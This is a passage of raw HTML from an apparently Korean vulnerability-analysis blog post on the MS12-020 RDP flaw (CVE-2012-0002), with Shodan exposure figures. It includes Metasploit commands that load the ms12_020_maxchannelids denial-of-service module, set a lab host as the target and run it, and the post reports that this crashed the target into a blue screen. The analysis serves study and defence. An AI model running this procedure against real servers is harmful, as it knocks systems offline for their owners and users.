url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAoUlEQVQY05XOSw6CMABFUTajpQV1oP0ptSktpB9ATQUSgvvfhhNHjkryhvckL/PD7PvJ+YiJggUpDhwWNEckZVkjWqs6xg3lmjJdCXs8XQHESdjKrq5aqQLjBhMl7o5yk4qlXuK4Pl9L/5iti9ZHzOrU286v7/ETukk3Q+gnqfwOnFPxTXhthhwRVDJUskT2wwDifX4BEANIACTb8Kb6D38BLXxeeUBrIt8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image9\"\n        title=\"image9\"\n        src=\"/static/304e57f44cea8f8eb27504749eafba40/f058b/image9.png\"\n        srcset=\"/static/304e57f44cea8f8eb27504749eafba40/e9ff0/image9.png 180w,\n/static/304e57f44cea8f8eb27504749eafba40/f21e7/image9.png 360w,\n/static/304e57f44cea8f8eb27504749eafba40/f058b/image9.png 630w\"\n        sizes=\"(max-width: 630px) 100vw, 630px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">workspace <span class=\"token operator\">-</span>a \\<span class=\"token operator\">&lt;</span>작업 공간\\<span class=\"token operator\">></span>  \\# 작업 공간 추가\n\nworkspace \\<span class=\"token operator\">&lt;</span>작업 공간\\<span class=\"token operator\">></span>     \\# 작업 공간 이동</code></pre></div>\n<h3 id=\"metasploit-db-연결-상태-확인-및-가져오기\" style=\"position:relative;\"><a href=\"#metasploit-db-%EC%97%B0%EA%B2%B0-%EC%83%81%ED%83%9C-%ED%99%95%EC%9D%B8-%EB%B0%8F-%EA%B0%80%EC%A0%B8%EC%98%A4%EA%B8%B0\" aria-label=\"metasploit db 연결 상태 확인 및 가져오기 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Metasploit DB 연결 상태 확인 및 가져오기</h3>\n<p>데이터베이스 상태를 확인한 후 만약 실패로 나온다면 PostgreSQL 서비스를\n키도록 한다. db_import 명령을 통해 다운 받은 Nessus DB 결과 정보를\n불러온다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAzElEQVQY06WQ7WqDMBRA+zIzRpNYmNebL6XNYkzVrq7DsfX9H2S0hbYO9mMMDgfuj3Mv3FUXv0I39eOsTIDKmbpD5VH5uom2iRmTaVbRvLr5kVWz/Rz2826Y2zAd3k79OMf+vdkMqLwyLaGQpGWSwoUySctFrO1pfP3w4dB2U9wdty/7EI/aBkAntZf6vALQATqUHtDRHO+xqSMTiuaYMZlzeTUvjFhbsba8MLwwTGgmNC/OXlx+Is+EwnUgFAitLsBvLOIfP/gT/4q/AT64VIaKS7LEAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image10\"\n        title=\"image10\"\n        src=\"/static/8d4ff2f976488f36ba8b794b3f405248/d8f62/image10.png\"\n        srcset=\"/static/8d4ff2f976488f36ba8b794b3f405248/e9ff0/image10.png 180w,\n/static/8d4ff2f976488f36ba8b794b3f405248/f21e7/image10.png 360w,\n/static/8d4ff2f976488f36ba8b794b3f405248/d8f62/image10.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">db_status               \\# DB 상태 확인\n\ndb_import \\<span class=\"token operator\">&lt;</span>파일 경로\\<span class=\"token operator\">></span>   \\# DB 불러오기</code></pre></div>\n<h3 id=\"점검-대상-서비스-정보-확인\" style=\"position:relative;\"><a href=\"#%EC%A0%90%EA%B2%80-%EB%8C%80%EC%83%81-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%A0%95%EB%B3%B4-%ED%99%95%EC%9D%B8\" aria-label=\"점검 대상 서비스 정보 확인 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>점검 대상 서비스 정보 확인</h3>\n<p>services 명령을 통해 서비스 정보를 확인한 결과 점검 대상인 msrdp/3389\n서비스가 열러 있음을 확인할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAvElEQVQY05XNWxKCIBiG4RbTlMes8CeBKEQUwULTTvftfw+NG9Ca+S6+m2feha77A1FhTLwA/7tFivPlCgVRtkenFAsEwgvwbvwyjMnahylcm17Ii5ANApERxc9mu+f8bOKEzZdd+7bNvdI3Qkt61JRVKYiidGGcTWdHXNlBKieUA6KAFEAKL8rYyQS/4Gf3ak3fNYMtrwXX8qghYZeq3WzoPP64x1N37/o2qKtlqhV1jnifW5zQlQ/+JP4C0eBWsgh+PMgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image11\"\n        title=\"image11\"\n        src=\"/static/4cbacd65a023b957fe7c9c22e2af4b41/32056/image11.png\"\n        srcset=\"/static/4cbacd65a023b957fe7c9c22e2af4b41/e9ff0/image11.png 180w,\n/static/4cbacd65a023b957fe7c9c22e2af4b41/f21e7/image11.png 360w,\n/static/4cbacd65a023b957fe7c9c22e2af4b41/32056/image11.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">services\n\n\\# <span class=\"token number\">192.168</span><span class=\"token number\">.111</span><span class=\"token number\">.146</span>     <span class=\"token number\">3389</span>     tcp         msrdp         <span class=\"token builtin\">open</span></code></pre></div>\n<h3 id=\"점검-대상-호스트-정보\" style=\"position:relative;\"><a href=\"#%EC%A0%90%EA%B2%80-%EB%8C%80%EC%83%81-%ED%98%B8%EC%8A%A4%ED%8A%B8-%EC%A0%95%EB%B3%B4\" aria-label=\"점검 대상 호스트 정보 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>점검 대상 호스트 정보</h3>\n<p>점검 대상 호스트 정보를 통해 네트워크 분류 기준을 정할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAmklEQVQY01VPiw6EIAzzZw4RBETGQMTHaUz8/y+6KAnZJc3SZuu6NXm9h3HhAgvazpdaCOPwcmDcF14nucAmpuvTQq9T0cZmxh+pzCzVNMJmbH7rArgrk6i/yevt/A74HWGzbvXhMHbBcMZ06WEuTh8OZWY9ZKli25FkjId1WyeD6COFVFP9QvSh8r+zGX/+eXtItno6StOo+QcArDhv4/CKhQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image12\"\n        title=\"image12\"\n        src=\"/static/a06db8ccbf35e86183e38a2c70d5f65a/d8f62/image12.png\"\n        srcset=\"/static/a06db8ccbf35e86183e38a2c70d5f65a/e9ff0/image12.png 180w,\n/static/a06db8ccbf35e86183e38a2c70d5f65a/f21e7/image12.png 360w,\n/static/a06db8ccbf35e86183e38a2c70d5f65a/d8f62/image12.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">hosts\n\n\\# <span class=\"token number\">192.168</span><span class=\"token number\">.111</span><span class=\"token number\">.146</span>   <span class=\"token number\">00</span><span class=\"token punctuation\">:</span>0c<span class=\"token punctuation\">:</span><span class=\"token number\">29</span><span class=\"token punctuation\">:</span>c2<span class=\"token punctuation\">:</span>1b<span class=\"token punctuation\">:</span>da  <span class=\"token number\">192.168</span><span class=\"token number\">.111</span><span class=\"token number\">.146</span>   Windows <span class=\"token number\">2008</span>  SP1   server</code></pre></div>\n<h3 id=\"취약점-검색\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EA%B2%80%EC%83%89\" aria-label=\"취약점 검색 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 검색</h3>\n<p>RDP 서비스에서 발생한 취약점 MS12-020을 기준으로 검색을 진행한다. 실제로\n검사 대상이 취약한지를 테스트하기 위해 Metasploit framework 모듈을 통해\n공격을 진행 한다.</p>\n<p><img src=\"./image13.png\" alt=\"\"></p>\n<p>search ms12-020</p>\n<p>use auxiliary/dos/windows/rdp/ms12_020_maxchannelids</p>\n<h3 id=\"ms12_020_maxchannelids-모듈\" style=\"position:relative;\"><a href=\"#ms12_020_maxchannelids-%EB%AA%A8%EB%93%88\" aria-label=\"ms12_020_maxchannelids 모듈 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ms12_020_maxchannelids 모듈</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 547px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABzUlEQVQY0zXKz2vTUADA8fwpKkMQQaUMQdR2VUS0mwpzExVR59DRbhMsA10HQk9uBxH05LHa2jrH2s6KJ8X7bNMkIykh7ZZke2lefti9vOSFhiLr6OfwPX2pc+evTEw+5DiOpularcYwDD3AHGA3N/9Wq1WGYcYnHoxcGqXpuiRJLMtCCKkL4at370+7rocxtkxD0wCEuq63TdMwTQNC3bYtz3Uxxo+m4rHRyWazhR1kGNAnhDpx8mz08tj7Dx+XV97FEy9evnqdWko/m3m+mEonZpNPZ+bn5hcWl9LJhdTYjTuh4fDjJ/HZueTUdOLN8lvqTOjitdjtUul7Llf4kl8tFjfK5Uq+8G29uFEqV76urn/O5jOfcplMrvLj59paMZs92LK5wq/ff6ih46FINLarqq1W08XYskxVVRwHybJs2xYhnqoqe3u7srzTlKSd7W1NA4os+z7B2KGOHDsVHrm+v49EUdzqEwThsCzLCoLAcVuNRoPnhXq9zvO8oigQQgCADiEVGo7cvHWv2+06jgMA8H0/CALP8xBCjuMQQg6L+ggheAAhRB0dOh2JxoIg0DRNFEVd1yGE7Xbb7IMQdjodAIBt2//6zIFer/cfbZZluBtvbPgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 2 8 7\"\n        title=\"image 2 8 7\"\n        src=\"/static/2a82d58915e2cb55e7be55b723889f38/977f7/image-2.8.7.png\"\n        srcset=\"/static/2a82d58915e2cb55e7be55b723889f38/e9ff0/image-2.8.7.png 180w,\n/static/2a82d58915e2cb55e7be55b723889f38/f21e7/image-2.8.7.png 360w,\n/static/2a82d58915e2cb55e7be55b723889f38/977f7/image-2.8.7.png 547w\"\n        sizes=\"(max-width: 547px) 100vw, 547px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">※ T<span class=\"token punctuation\">.</span><span class=\"token number\">125</span><span class=\"token punctuation\">:</span> 원격 회의<span class=\"token punctuation\">,</span> 화상 회의 및 컴퓨터 지원 공동 작업을 위한 지점 간\n통신 프로토콜 모음이며 애플리케이션 공유<span class=\"token punctuation\">,</span> 온라인 채팅<span class=\"token punctuation\">,</span> 파일 공유 및 기타\n기능 제공</code></pre></div>\n<h2 id=\"모듈-옵션-설정\" style=\"position:relative;\"><a href=\"#%EB%AA%A8%EB%93%88-%EC%98%B5%EC%85%98-%EC%84%A4%EC%A0%95\" aria-label=\"모듈 옵션 설정 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>모듈 옵션 설정</h2>\n<p><img src=\"./image14.png\" alt=\"\"></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token builtin\">set</span> RHOST <span class=\"token number\">192.168</span><span class=\"token number\">.111</span><span class=\"token number\">.146</span>\n\nshow options</code></pre></div>\n<h2 id=\"공격\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9\" aria-label=\"공격 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격</h2>\n<p>대상 서버를 대상으로 MS12-020 취약점 모듈을 실행한 결과 분석된 결과와\n동일하게 BSOD가 발생한 것을 확인할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 11.666666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAbUlEQVQI113GUQ6DIAwAUG8zx5Jls1RjolCcUEowwszuf5XFX5P38Zph3IOU1ReW72wlcF1DYTloySn/ohyTiYAWkDQ6QNdpeoMBbdVjaHBOHKuP1XM1lMKZQks2lNxn67R9vqZW9bc7XrSq/wNZrRzj9WAeJQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image15\"\n        title=\"image15\"\n        src=\"/static/166a87a3e754290df73519dbb1b26e6b/d8f62/image15.png\"\n        srcset=\"/static/166a87a3e754290df73519dbb1b26e6b/e9ff0/image15.png 180w,\n/static/166a87a3e754290df73519dbb1b26e6b/f21e7/image15.png 360w,\n/static/166a87a3e754290df73519dbb1b26e6b/d8f62/image15.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">exploit  \\#run 명령을 사용해도 된다<span class=\"token punctuation\">.</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 349px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 75%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAIAAABr+ngCAAAACXBIWXMAAA7EAAAOxAGVKw4bAAACe0lEQVQoz1WSWW+bQBDHFzDgAJtluTHmsmU7seWHPOVT9SlppTZqE5v7xnYcqf20LZBYqfTXaGakOfa3A0wz1rQIwh3LPnPcy3j8TNM/AfjR6+mT8/S/8wuAL0BRSoRyUcwnk8Y0a9NsNK0ajxOezzgu4bj04kCYEUQIQAhAAEAMwFcwmx2m09qyKk0rNa3k+USWC4wzw6gMo8sYRqUoXUZVCwBePhQB8Ahct1XVwjRrhFJRzBQlxziX5QKhDMJE0wpRzAQh0fVSFDNZzg2j5Pn4vdiyatOsHKf1/YPnHVy3dZzWdbvQNCtJ6hrxfKIohSTlktS1vr5OSTIG4AHoejmfHy2rNozK89rptF4sjppWeF5rWbWqFpZV63rpuo1pVrbdOE5LUfv+5Y9guTwul6ft9s33u2m+3y4WJ89rV6vTfH7w/cNqdZrN2u32zXEa121vbl5ZNnwvnky63XS9AyMIKUnuex673u577Qhi32d2ffgCwHNf/AAUpdC0UlEK2+4WE8UMoQzjbGB+fZ1inItiJkk5Qu+hLOcYl4LwHahqYRilrpeWVQtCQpIBy0YsG7NsxDARTUfjcTyIYUKaDhkmurqKGCalqK+A4xKWjWQ557iYpkNZLgQhgTAd8IpiBmHKcfEAXJY74DwfI1Rg/AQg7DZh2Ygk9yS5p6iAIAKC2NN0OGg0CigqoKiQpqNhOEUFo1FC09/A8BPTaWPbjSTlqlo4TmMYFUkGnyBdgF3UA7u//7PZnO/ufq/Xr+v1eb0+bzbn29szxhlFBR/FlxaXRv2FLRbdhXjewbab2ewwnx+HFWQ5hzDtbTJcKEIZQimECcYZz+f/Jv8FSwTCfrPG1vgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image16\"\n        title=\"image16\"\n        src=\"/static/f26dc4540ea4c19762d5b84c939c62c5/e9bf8/image16.png\"\n        srcset=\"/static/f26dc4540ea4c19762d5b84c939c62c5/e9ff0/image16.png 180w,\n/static/f26dc4540ea4c19762d5b84c939c62c5/e9bf8/image16.png 349w\"\n        sizes=\"(max-width: 349px) 100vw, 349px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h1 id=\"분석-개요\" style=\"position:relative;\"><a href=\"#%EB%B6%84%EC%84%9D-%EA%B0%9C%EC%9A%94\" aria-label=\"분석 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>분석 개요</h1>\n<h2 id=\"취약점-분석-배경\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-%EB%B0%B0%EA%B2%BD\" aria-label=\"취약점 분석 배경 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석 배경</h2>\n<p>외부망에 노출되어 있는 RDP 프로토콜은 해킹을 통해 시스템을 완전히 제어가\n가능하기 때문에 대상 목록상 우선이 되곤 한다. 또한 공격자가 정상적인\n프로토콜을 통해 시스템에 접속을 하기 때문에 보안 관리자가 악의적인\n활동을 탐지하기 어렵다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABV0lEQVQY02WQT0+CcByHeWupuOY/wJkgE/ozM8rNVfM1dOrgybdRq0NtXurUViv8oSJoa61Qi7lsE0T5Ab8GtNbqu+/hc3kOz4Oh3+d538N1EUJmXxGzcVnguuVir1pqr689ZFZEChfJWPiY5zjQmJn6+0J7dS3LhdCeftgTHXmeD1OxNp/rbDGATobAQyYisUR3p9jKrWIuhHrz8qlRt0ZDYzzSzk6ej49eGvWFrpsDVaTwbrmo1iqdbVYkoiEMCmnlUAD5BIYQcubzt+aFNZl8Dvrj6yvt/FS/vUEIGWovgLletSQLPGBSPk9EAZ1Qa7uASWGhJzSM6f0dNE1jqCGEZoO+C6H5qIpkTBZ4WeAkjmzzWV84E2nRSWW/HMBhINt2lsufbF6wg2C4XNmU9zYklgB0SiRxkYi28gnlQABMGvtX2/tTG+SToJCWWDKAg84U7itk41+oaCvbTT4b4wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image17\"\n        title=\"image17\"\n        src=\"/static/7e9e0942781196febe56538f7eac7f0e/32056/image17.png\"\n        srcset=\"/static/7e9e0942781196febe56538f7eac7f0e/e9ff0/image17.png 180w,\n/static/7e9e0942781196febe56538f7eac7f0e/f21e7/image17.png 360w,\n/static/7e9e0942781196febe56538f7eac7f0e/32056/image17.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>국가별 빈도</p>\n<p>출처: <a href=\"https://www.shodan.io/\">https://www.shodan.io/</a></p>\n<p>특히 최근에는 원격 화상회의 등 원격 업무 비율이 높아짐에 따라 RDP\n서비스를 사용하는 빈도율이 높아져 사이버 범죄에 노출 여부가 커지고 있다.\n동시에 기업 내에서는 RDP 서비스를 사용함에도 불구하고 인증 체계를\n사용하지 않거나 접근 통제를 실시하지 않는 등 업데이트를 크게 중요시하지\n않는 등 보안적으로 미흡이 되는 부분이 많다.</p>\n<p>이번 분석에서는 RDP 프로토콜을 통한 서비스 거부 공격에 쓰이는\nCVE-2012-0002를 분석할 것이다.</p>\n<h2 id=\"cve-2012-0002-취약점-요약\" style=\"position:relative;\"><a href=\"#cve-2012-0002-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%9A%94%EC%95%BD\" aria-label=\"cve 2012 0002 취약점 요약 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 